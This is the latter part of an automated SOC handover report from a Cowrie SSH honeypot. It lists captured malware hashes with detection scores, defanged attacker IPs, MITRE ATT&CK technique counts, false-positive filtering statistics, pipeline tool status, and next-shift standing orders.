| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 39/100 | 🟢 LOW | **23/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `171.231.180[.]167` | VN | Viettel Group | **100** ⚠️ | 1 |
| `201.218.0[.]25` | EC | Telconet S.A | **100** ⚠️ | 2 |
| `211.23.109[.]116` | TW | Data Communication Business Group, | **100** ⚠️ | 50 |
| `187.8.3[.]230` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |
| `82.102.165[.]200` | IL | Partner Communications Ltd. | **100** ⚠️ | 50 |
| `157.230.150[.]187` | US | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `18.191.32[.]78` | US | Amazon Technologies Inc. | **100** ⚠️ | 1 |
| `43.153.13[.]30` | US | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 8 |
| `119.152.102[.]54` | PK | Pakistan Telecommunication Company Limited | **100** ⚠️ | 50 |
| `183.171.11[.]79` | MY | Celcom Axiata Berhad | **100** ⚠️ | 17 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 97 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 65 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 23 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 11 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 11 |

---

## 🔕 False Positive Summary (72 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 10 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 10 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 56 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 195 cases |
| Tool 34  | Credential Extractor        | ✅ 88 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 71 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 72 filtered (36.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 51 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 23 priority case(s) shown individually · 55 recon entry/entries in table (12 group(s) consolidating 57 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-16T11:19:06Z_
